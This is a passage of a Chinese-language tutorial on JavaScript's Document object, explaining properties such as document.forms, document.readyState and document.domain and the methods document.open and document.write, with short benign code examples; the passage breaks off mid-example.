<h5 id="（6）document-activeElement-返回文档中获取焦点的元素，一般为表单元素，如没有则返回或null"><a href="#（6）document-activeElement-返回文档中获取焦点的元素，一般为表单元素，如没有则返回或null" class="headerlink" title="（6）document.activeElement 返回文档中获取焦点的元素，一般为表单元素，如没有则返回&lt;body&gt;或null"></a>（6）document.activeElement 返回文档中获取焦点的元素，一般为表单元素，如没有则返回&lt;body&gt;或null</h5><p><code>document.activeElement</code>属性<strong>返回获得当前焦点（focus）的 DOM 元素</strong>。通常，这个属性返回的是<code>&lt;input&gt;</code>、<code>&lt;textarea&gt;</code>、<code>&lt;select&gt;</code>等表单元素，如果当前没有焦点元素，返回<code>&lt;body&gt;</code>元素或<code>null</code>。</p>
<h5 id="（7）document-fullscreenElement-返回当前以全屏状态展示的-DOM-元素"><a href="#（7）document-fullscreenElement-返回当前以全屏状态展示的-DOM-元素" class="headerlink" title="（7）document.fullscreenElement 返回当前以全屏状态展示的 DOM 元素"></a>（7）document.fullscreenElement 返回当前以全屏状态展示的 DOM 元素</h5><p><code>document.fullscreenElement</code>属性<strong>返回当前以全屏状态展示的 DOM 元素</strong>。如果不是全屏状态，该属性返回<code>null</code>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable language_">document</span>.<span class="property">fullscreenElement</span>.<span class="property">nodeName</span> == <span class="string">&#x27;VIDEO&#x27;</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;全屏播放视频&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面代码中，通过<code>document.fullscreenElement</code>可以知道<code> &lt;video&gt; </code>元素有没有处在全屏状态，从而判断用户行为。</p>
<h4 id="2-2-节点集合属性-（文档内部特定元素的集合，返HTMLCollection实例）"><a href="#2-2-节点集合属性-（文档内部特定元素的集合，返HTMLCollection实例）" class="headerlink" title="2.2 节点集合属性 （文档内部特定元素的集合，返HTMLCollection实例）"></a>2.2 节点集合属性 （文档内部特定元素的集合，返HTMLCollection实例）</h4><p>以下属性<strong>返回一个<code>HTMLCollection</code>实例</strong>，表示文档内部特定元素的集合。这些集合都是<strong>动态的</strong>，原节点有任何变化，立刻会反映在集合中。 </p>
<h5 id="（1）document-links-返回所有含href属性的和"><a href="#（1）document-links-返回所有含href属性的和" class="headerlink" title="（1）document.links 返回所有含href属性的&lt;a&gt;和&lt;area&gt;"></a>（1）document.links 返回所有含href属性的&lt;a&gt;和&lt;area&gt;</h5><p><code>document.links</code>属性<strong>返回当前文档所有设定了<code>href</code>属性的<code> &lt;a&gt; </code>及<code>&lt;area&gt;</code>节点。</strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 打印文档所有的链接</span></span><br><span class="line"><span class="keyword">var</span> links = <span class="variable language_">document</span>.<span class="property">links</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; links.<span class="property">length</span>; i++) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(links[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h5 id="（2）document-forms-返回所有-表单节点"><a href="#（2）document-forms-返回所有-表单节点" class="headerlink" title="（2）document.forms 返回所有&lt;form&gt; 表单节点"></a>（2）document.forms 返回所有&lt;form&gt; 表单节点</h5><p><code>document.forms</code>属性<strong>返回所有<code>&lt;form&gt;</code>表单节点</strong>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> selectForm = <span class="variable language_">document</span>.<span class="property">forms</span>[<span class="number">0</span>];</span><br></pre></td></tr></table></figure>

<p>上面代码获取文档第一个表单。</p>
<p>除了使用位置序号，<code>id</code>属性和<code>name</code>属性也可以用来引用表单。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* HTML 代码如下</span></span><br><span class="line"><span class="comment">  &lt;form name=&quot;foo&quot; id=&quot;bar&quot;&gt;&lt;/form&gt;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="property">forms</span>[<span class="number">0</span>] === <span class="variable language_">document</span>.<span class="property">forms</span>.<span class="property">foo</span> <span class="comment">// true</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="property">forms</span>.<span class="property">bar</span> === <span class="variable language_">document</span>.<span class="property">forms</span>.<span class="property">foo</span> <span class="comment">// true</span></span><br></pre></td></tr></table></figure>



<h5 id="（3）document-images-返回页面所有-图片节点"><a href="#（3）document-images-返回页面所有-图片节点" class="headerlink" title="（3）document.images 返回页面所有 &lt;img&gt; 图片节点"></a>（3）document.images 返回页面所有<code> &lt;img&gt; </code>图片节点</h5><p><code>document.images</code>属性<strong>返回页面所有<code> &lt;img&gt; </code>图片节点</strong>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> imglist = <span class="variable language_">document</span>.<span class="property">images</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; imglist.<span class="property">length</span>; i++) &#123;</span><br><span class="line">  <span class="keyword">if</span> (imglist[i].<span class="property">src</span> === <span class="string">&#x27;banner.gif&#x27;</span>) &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面代码在所有<code>img</code>标签中，寻找某张图片。</p>
<h5 id="（4）document-embeds，document-plugins-返回所有嵌入节点"><a href="#（4）document-embeds，document-plugins-返回所有嵌入节点" class="headerlink" title="（4）document.embeds，document.plugins 返回所有&lt;embed&gt;嵌入节点"></a>（4）document.embeds，document.plugins 返回所有<code>&lt;embed&gt;</code>嵌入节点</h5><p><code>document.embeds</code>属性和<code>document.plugins</code>属性，都<strong>返回所有<code>&lt;embed&gt;</code>节点</strong>。</p>
<h5 id="（5）document-scripts-返回所有-节点"><a href="#（5）document-scripts-返回所有-节点" class="headerlink" title="（5）document.scripts  返回所有 &lt;script&gt; 节点"></a>（5）document.scripts  返回所有<code> &lt;script&gt; </code>节点</h5><p><code>document.scripts</code>属性<strong>返回所有<code> &lt;script&gt; </code>节点</strong>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> scripts = <span class="variable language_">document</span>.<span class="property">scripts</span>;</span><br><span class="line"><span class="keyword">if</span> (scripts.<span class="property">length</span> !== <span class="number">0</span> ) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;当前网页有脚本&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h5 id="（6）document-styleSheets-返回文档内嵌或引入的样式表集合"><a href="#（6）document-styleSheets-返回文档内嵌或引入的样式表集合" class="headerlink" title="（6）document.styleSheets 返回文档内嵌或引入的样式表集合"></a>（6）document.styleSheets 返回文档内嵌或引入的样式表集合</h5><p><code>document.styleSheets</code>属性<strong>返回文档内嵌或引入的样式表集合</strong>，详细介绍请看《CSS 操作》一章。</p>
<h5 id="（7）小结（除了styleSheets属性，其他返回都是HTMLCollection实例）"><a href="#（7）小结（除了styleSheets属性，其他返回都是HTMLCollection实例）" class="headerlink" title="（7）小结（除了styleSheets属性，其他返回都是HTMLCollection实例）"></a>（7）小结（除了styleSheets属性，其他返回都是HTMLCollection实例）</h5><p>除了<code>document.styleSheets</code>，以上的集合属性返回的都是<code>HTMLCollection</code>实例。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="property">links</span> <span class="keyword">instanceof</span> <span class="title class_">HTMLCollection</span> <span class="comment">// true</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="property">images</span> <span class="keyword">instanceof</span> <span class="title class_">HTMLCollection</span> <span class="comment">// true</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="property">forms</span> <span class="keyword">instanceof</span> <span class="title class_">HTMLCollection</span> <span class="comment">// true</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="property">embeds</span> <span class="keyword">instanceof</span> <span class="title class_">HTMLCollection</span> <span class="comment">// true</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="property">scripts</span> <span class="keyword">instanceof</span> <span class="title class_">HTMLCollection</span> <span class="comment">// true</span></span><br></pre></td></tr></table></figure>

<p><code>HTMLCollection</code>实例是<strong>类似数组的对象</strong>，所以这些属性都有<code>length</code>属性，<strong>都可以使用方括号运算符引用成员</strong>。如果成员有<code>id</code>或<code>name</code>属性，还可以用这两个属性的值，在<code>HTMLCollection</code>实例上引用到这个成员。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// HTML 代码如下</span></span><br><span class="line"><span class="comment">// &lt;form name=&quot;myForm&quot;&gt;</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="property">myForm</span> === <span class="variable language_">document</span>.<span class="property">forms</span>.<span class="property">myForm</span> <span class="comment">// true</span></span><br></pre></td></tr></table></figure>



<h4 id="2-3-文档静态信息属性"><a href="#2-3-文档静态信息属性" class="headerlink" title="2.3 文档静态信息属性"></a>2.3 文档静态信息属性</h4><p>以下属性<strong>返回文档信息</strong>。</p>
<h5 id="（1）document-documentURI，document-URL-返回网址字符串"><a href="#（1）document-documentURI，document-URL-返回网址字符串" class="headerlink" title="（1）document.documentURI，document.URL 返回网址字符串"></a>（1）document.documentURI，document.URL 返回网址字符串</h5><p><code>document.documentURI</code>属性和<code>document.URL</code>属性都<strong>返回一个字符串，表示当前文档的网址</strong>。不同之处是它们继承自不同的接口，<code>documentURI</code>继承自<code>Document</code>接口，可用于所有文档；<code>URL</code>继承自<code>HTMLDocument</code>接口，只能用于 HTML 文档。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="property">URL</span></span><br><span class="line"><span class="comment">// http://www.example.com/about</span></span><br><span class="line"></span><br><span class="line"><span class="variable language_">document</span>.<span class="property">documentURI</span> === <span class="variable language_">document</span>.<span class="property">URL</span></span><br><span class="line"><span class="comment">// true</span></span><br></pre></td></tr></table></figure>

<p>如果<strong>文档的锚点（<code>#anchor</code>）变化，这两个属性都会跟着变化</strong>。</p>
<h5 id="（2）document-domain-返回域名"><a href="#（2）document-domain-返回域名" class="headerlink" title="（2）document.domain 返回域名"></a>（2）document.domain 返回域名</h5><p><code>document.domain</code>属性<strong>返回当前文档的域名，不包含协议和端口</strong>。比如，网页的网址是<code>http://www.example.com:80/hello.html</code>，那么<code>document.domain</code>属性就等于<code>www.example.com</code>。如果无法获取域名，该属性返回<code>null</code>。</p>
<p><code>document.domain</code>基本上是一个只读属性，只有一种情况除外。次级域名的网页，可以把<code>document.domain</code>设为对应的上级域名。比如，当前域名是<code>a.sub.example.com</code>，则<code>document.domain</code>属性可以设置为<code>sub.example.com</code>，也可以设为<code>example.com</code>。修改后，<code>document.domain</code>相同的两个网页，可以读取对方的资源，比如设置的 Cookie。</p>
<p>另外，设置<code>document.domain</code>会导致端口被改成<code>null</code>。因此，如果通过设置<code>document.domain</code>来进行通信，双方网页都必须设置这个值，才能保证端口相同。</p>
<h5 id="（3）document-location-提供-URL-相关的信息和操作方法"><a href="#（3）document-location-提供-URL-相关的信息和操作方法" class="headerlink" title="（3）document.location 提供 URL 相关的信息和操作方法"></a>（3）document.location 提供 URL 相关的信息和操作方法</h5><p><code>Location</code>对象是浏览器提供的原生对象，提供 URL 相关的信息和操作方法。通过<code>window.location</code>和<code>document.location</code>属性，可以拿到这个对象。</p>
<p>关于这个对象的详细介绍，请看《浏览器模型》部分的《Location 对象》章节。</p>
<h5 id="（4）document-lastModified-返回当前文档最后修改的时间"><a href="#（4）document-lastModified-返回当前文档最后修改的时间" class="headerlink" title="（4）document.lastModified  返回当前文档最后修改的时间"></a>（4）document.lastModified  返回当前文档最后修改的时间</h5><p><code>document.lastModified</code>属性返回一个<strong>字符串</strong>，表示<strong>当前文档最后修改的时间</strong>。不同浏览器的返回值，日期格式是不一样的。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="property">lastModified</span></span><br><span class="line"><span class="comment">// &quot;03/07/2018 11:18:27&quot;</span></span><br></pre></td></tr></table></figure>

<p>注意，<code>document.lastModified</code>属性的值是字符串，所以不能直接用来比较。<code>Date.parse</code>方法将其转为<code>Date</code>实例，才能比较两个网页。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> lastVisitedDate = <span class="title class_">Date</span>.<span class="title function_">parse</span>(<span class="string">&#x27;01/01/2018&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="title class_">Date</span>.<span class="title function_">parse</span>(<span class="variable language_">document</span>.<span class="property">lastModified</span>) &gt; lastVisitedDate) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;网页已经变更&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果页面上有 JavaScript 生成的内容，<code>document.lastModified</code>属性返回的总是当前时间。</p>
<h5 id="（5）document-title-返回当前文档的标题"><a href="#（5）document-title-返回当前文档的标题" class="headerlink" title="（5）document.title  返回当前文档的标题"></a>（5）document.title  返回当前文档的标题</h5><p><code>document.title</code>属性<strong>返回当前文档的标题</strong>。默认情况下，返回<code>&lt;title&gt;</code>节点的值。但是该属性是可写的，一旦被修改，就返回修改后的值。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="property">title</span> = <span class="string">&#x27;新标题&#x27;</span>;</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">title</span> <span class="comment">// &quot;新标题&quot;</span></span><br></pre></td></tr></table></figure>



<h5 id="（6）document-characterSet-返回当前文档的编码，如UTF-8等"><a href="#（6）document-characterSet-返回当前文档的编码，如UTF-8等" class="headerlink" title="（6）document.characterSet 返回当前文档的编码，如UTF-8等"></a>（6）document.characterSet 返回当前文档的编码，如UTF-8等</h5><p><code>document.characterSet</code>属性<strong>返回当前文档的编码</strong>，比如<code>UTF-8</code>、<code>ISO-8859-1</code>等等。</p>
<h5 id="（7）document-referrer-当前文档的访问者来自哪里（如通过百度进入的）"><a href="#（7）document-referrer-当前文档的访问者来自哪里（如通过百度进入的）" class="headerlink" title="（7）document.referrer 当前文档的访问者来自哪里（如通过百度进入的）"></a>（7）document.referrer 当前文档的访问者来自哪里（如通过百度进入的）</h5><p><code>document.referrer</code>属性<strong>返回一个字符串，表示当前文档的访问者来自哪里</strong>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="property">referrer</span></span><br><span class="line"><span class="comment">// &quot;https://example.com/path&quot;</span></span><br></pre></td></tr></table></figure>

<p>如果无法获取来源，或者用户直接键入网址而不是从其他网页点击进入，<code>document.referrer</code>返回一个空字符串。</p>
<p><code>document.referrer</code>的值，总是与 HTTP 头信息的<code>Referer</code>字段保持一致。但是，<code>document.referrer</code>的拼写有两个<code>r</code>，而头信息的<code>Referer</code>字段只有一个<code>r</code>。</p>
<h5 id="（8）document-dir-返回文字方向（rtl从右到左，ltr从左到右）"><a href="#（8）document-dir-返回文字方向（rtl从右到左，ltr从左到右）" class="headerlink" title="（8）document.dir 返回文字方向（rtl从右到左，ltr从左到右）"></a>（8）document.dir 返回文字方向（rtl从右到左，ltr从左到右）</h5><p><code>document.dir</code>返回<strong>一个字符串，表示文字方向</strong>。它<strong>只有两个可能</strong>的值：<code>rtl</code>表示文字从右到左，阿拉伯文是这种方式；<code>ltr</code>表示文字从左到右，包括英语和汉语在内的大多数文字采用这种方式。</p>
<blockquote>
<p>注： 第一次调用该属性时，可能返回空字符串”” </p>
</blockquote>
<h5 id="（9）document-compatMode-返回浏览器处理文档的模式（向后兼容与严格模式）"><a href="#（9）document-compatMode-返回浏览器处理文档的模式（向后兼容与严格模式）" class="headerlink" title="（9）document.compatMode 返回浏览器处理文档的模式（向后兼容与严格模式）"></a>（9）document.compatMode 返回浏览器处理文档的模式（向后兼容与严格模式）</h5><p><code>compatMode</code>属性返回浏览器处理文档的模式，可能的值为<code>BackCompat</code>（向后兼容模式）和<code>CSS1Compat</code>（严格模式）。</p>
<p>一般来说，如果网页代码的第一行设置了明确的<code>DOCTYPE</code>（比如&#96;&#96;），<code>document.compatMode</code>的值都为<code>CSS1Compat</code>。</p>
<h4 id="2-4-文档状态属性"><a href="#2-4-文档状态属性" class="headerlink" title="2.4 文档状态属性"></a>2.4 文档状态属性</h4><h5 id="（1）document-hidden-当前页面是否可见，返布尔值。"><a href="#（1）document-hidden-当前页面是否可见，返布尔值。" class="headerlink" title="（1）document.hidden 当前页面是否可见，返布尔值。"></a>（1）document.hidden 当前页面是否可见，返布尔值。</h5><p><code>document.hidden</code>属性<strong>返回一个布尔值，表示当前页面是否可见</strong>。如果<strong>窗口最小化、浏览器切换了 Tab，都会导致导致页面不可见，使得<code>document.hidden</code>返回<code>true</code>。</strong></p>
<p>这个属性是 Page Visibility API 引入的，一般都是配合这个 API 使用。</p>
<h5 id="（2）document-visibilityState-返回文档可见状态（visible、hidden、prerender、unloaded）"><a href="#（2）document-visibilityState-返回文档可见状态（visible、hidden、prerender、unloaded）" class="headerlink" title="（2）document.visibilityState 返回文档可见状态（visible、hidden、prerender、unloaded）"></a>（2）document.visibilityState 返回文档可见状态（visible、hidden、prerender、unloaded）</h5><p><code>document.visibilityState</code><strong>返回文档的可见状态</strong>。</p>
<p>它的值有<strong>四种状态</strong>。</p>
<blockquote>
<ul>
<li><code>visible</code>：页面可见。注意，页面可能是部分可见，即不是焦点窗口，前面被其他窗口部分挡住了。</li>
<li><code>hidden</code>：页面不可见，有可能窗口最小化，或者浏览器切换到了另一个 Tab。</li>
<li><code>prerender</code>：页面处于正在渲染状态，对于用户来说，该页面不可见。</li>
<li><code>unloaded</code>：页面从内存里面卸载了。</li>
</ul>
</blockquote>
<p><strong>这个属性可以用在页面加载时，防止加载某些资源；或者页面不可见时，停掉一些页面功能。</strong></p>
<h5 id="（3）document-readyState-返回当前文档的状态（loading、interactive、complete）"><a href="#（3）document-readyState-返回当前文档的状态（loading、interactive、complete）" class="headerlink" title="（3）document.readyState 返回当前文档的状态（loading、interactive、complete）"></a>（3）document.readyState 返回当前文档的状态（loading、interactive、complete）</h5><p><code>document.readyState</code>属性<strong>返回当前文档的状态</strong>，共有<strong>三种可能</strong>的值。</p>
<ul>
<li><code>loading</code>：加载 HTML 代码阶段（尚未完成解析）</li>
<li><code>interactive</code>：加载外部资源阶段</li>
<li><code>complete</code>：加载完成</li>
</ul>
<p>这个属性变化的过程如下。</p>
<ol>
<li>浏览器开始解析 HTML 文档，<code>document.readyState</code>属性等于<code>loading</code>。</li>
<li>浏览器遇到 HTML 文档中的<code> &lt;script&gt; </code>元素，并且没有<code>async</code>或<code>defer</code>属性，就暂停解析，开始执行脚本，这时<code>document.readyState</code>属性还是等于<code>loading</code>。</li>
<li>HTML 文档解析完成，<code>document.readyState</code>属性变成<code>interactive</code>。</li>
<li>浏览器等待图片、样式表、字体文件等外部资源加载完成，一旦全部加载完成，<code>document.readyState</code>属性变成<code>complete</code>。</li>
</ol>
<p>下面的代码用来检查网页是否加载成功。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 基本检查</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable language_">document</span>.<span class="property">readyState</span> === <span class="string">&#x27;complete&#x27;</span>) &#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 轮询检查</span></span><br><span class="line"><span class="keyword">var</span> interval = <span class="built_in">setInterval</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="variable language_">document</span>.<span class="property">readyState</span> === <span class="string">&#x27;complete&#x27;</span>) &#123;</span><br><span class="line">    <span class="built_in">clearInterval</span>(interval);</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;, <span class="number">100</span>);</span><br></pre></td></tr></table></figure>

<p>另外，<strong>每次状态变化都会触发一个<code>readystatechange</code>事件。</strong></p>
<h4 id="2-5-document-cookie-用来操作浏览器-Cookie"><a href="#2-5-document-cookie-用来操作浏览器-Cookie" class="headerlink" title="2.5 document.cookie 用来操作浏览器 Cookie"></a>2.5 document.cookie 用来操作浏览器 Cookie</h4><p><code>document.cookie</code>属性用来操作浏览器 Cookie，详见《浏览器模型》部分的《Cookie》章节。</p>
<h4 id="2-6-document-designMode-控制当前文档是否可编辑（on、off）"><a href="#2-6-document-designMode-控制当前文档是否可编辑（on、off）" class="headerlink" title="2.6 document.designMode 控制当前文档是否可编辑（on、off）"></a>2.6 document.designMode 控制当前文档是否可编辑（on、off）</h4><p><code>document.designMode</code>属性**控制当前文档是否可编辑。该属性只有两个值<code>on</code>和<code>off</code>，默认值为<code>off</code>**。一旦设为<code>on</code>，用户就可以编辑整个文档的内容。</p>
<p>下面代码打开<code>iframe</code>元素内部文档的<code>designMode</code>属性，就能将其变为一个所见即所得的编辑器。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// HTML 代码如下</span></span><br><span class="line"><span class="comment">// &lt;iframe id=&quot;editor&quot; src=&quot;about:blank&quot;&gt;&lt;/iframe&gt;</span></span><br><span class="line"><span class="keyword">var</span> editor = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;editor&#x27;</span>);</span><br><span class="line">editor.<span class="property">contentDocument</span>.<span class="property">designMode</span> = <span class="string">&#x27;on&#x27;</span>;</span><br></pre></td></tr></table></figure>



<h4 id="2-7-document-implementation-返回一个DOMImplementation对象"><a href="#2-7-document-implementation-返回一个DOMImplementation对象" class="headerlink" title="2.7 document.implementation 返回一个DOMImplementation对象"></a>2.7 document.implementation 返回一个<code>DOMImplementation</code>对象</h4><p><code>document.implementation</code>属性<strong>返回一个<code>DOMImplementation</code>对象</strong>。该对象有三个方法，<strong>主要用于创建独立于当前文档的新的 Document 对象</strong>。</p>
<ul>
<li><code>DOMImplementation.createDocument()</code>：创建一个 XML 文档。</li>
<li><code>DOMImplementation.createHTMLDocument()</code>：创建一个 HTML 文档。</li>
<li><code>DOMImplementation.createDocumentType()</code>：创建一个 DocumentType 对象。</li>
</ul>
<p>下面是创建 HTML 文档的例子。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> doc = <span class="variable language_">document</span>.<span class="property">implementation</span>.<span class="title function_">createHTMLDocument</span>(<span class="string">&#x27;Title&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> p = doc.<span class="title function_">createElement</span>(<span class="string">&#x27;p&#x27;</span>);</span><br><span class="line">p.<span class="property">innerHTML</span> = <span class="string">&#x27;hello world&#x27;</span>;</span><br><span class="line">doc.<span class="property">body</span>.<span class="title function_">appendChild</span>(p);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">replaceChild</span>(</span><br><span class="line">  doc.<span class="property">documentElement</span>,</span><br><span class="line">  <span class="variable language_">document</span>.<span class="property">documentElement</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>上面代码中，第一步生成一个新的 HTML 文档<code>doc</code>，然后用它的根元素<code>document.documentElement</code>替换掉<code>document.documentElement</code>。这会使得当前文档的内容全部消失，变成<code>hello world</code>。</p>
<h3 id="3、方法"><a href="#3、方法" class="headerlink" title="3、方法"></a>3、方法</h3><h4 id="3-1-document-open-，document-close-打开和关闭文档可写状态"><a href="#3-1-document-open-，document-close-打开和关闭文档可写状态" class="headerlink" title="3.1 document.open()，document.close() 打开和关闭文档可写状态"></a>3.1 document.open()，document.close() 打开和关闭文档可写状态</h4><p><code>document.open</code>方法<strong>清除当前文档所有内容，使得文档处于可写状态，供<code>document.write</code>方法写入内容</strong>。</p>
<p><code>document.close</code>方法用来<strong>关闭<code>document.open()</code>打开的文档</strong>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">open</span>();</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&#x27;hello world&#x27;</span>);</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">close</span>();</span><br></pre></td></tr></table></figure>



<h4 id="3-2-document-write-向当前文档写入内容，document-writeln-写入内容并换行"><a href="#3-2-document-write-向当前文档写入内容，document-writeln-写入内容并换行" class="headerlink" title="3.2 document.write() 向当前文档写入内容，document.writeln() 写入内容并换行"></a>3.2 document.write() 向当前文档写入内容，document.writeln() 写入内容并换行</h4><p><code>document.write</code>方法<strong>用于向当前文档写入内容</strong>。</p>
<p>在网页的首次渲染阶段，只要页面没有关闭写入（即没有执行<code>document.close()</code>），<code>document.write</code>写入的内容就会追加在已有内容的后面。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 页面显示“helloworld”</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">open</span>();</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&#x27;hello&#x27;</span>);</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&#x27;world&#x27;</span>);</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">close</span>();</span><br></pre></td></tr></table></figure>

<p>注意，<code>document.write</code>会当作 HTML 代码解析，不会转义。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&#x27;&lt;p&gt;hello world&lt;/p&gt;&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>document.write</code>会将<code> &lt;p&gt; </code>当作 HTML 标签解释。</p>
<p>如果页面已经解析完成（<code>DOMContentLoaded</code>事件发生之后），再调用<code>write</code>方法，它会先调用<code>open</code>方法，擦除当前文档所有内容，然后再写入。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;DOMContentLoaded&#x27;</span>, <span class="keyword">function</span> (<span class="params">event</span>) &#123;</span><br><span class="line">  <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&#x27;&lt;p&gt;Hello World!&lt;/p&gt;&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 等同于</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;DOMContentLoaded&#x27;</span>, <span class="keyword">function</span> (<span class="params">event</span>) &#123;</span><br><span class="line">  <span class="variable language_">document</span>.<span class="title function_">open</span>();</span><br><span class="line">  <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&#x27;&lt;p&gt;Hello World!&lt;/p&gt;&#x27;</span>);</span><br><span class="line">  <span class="variable 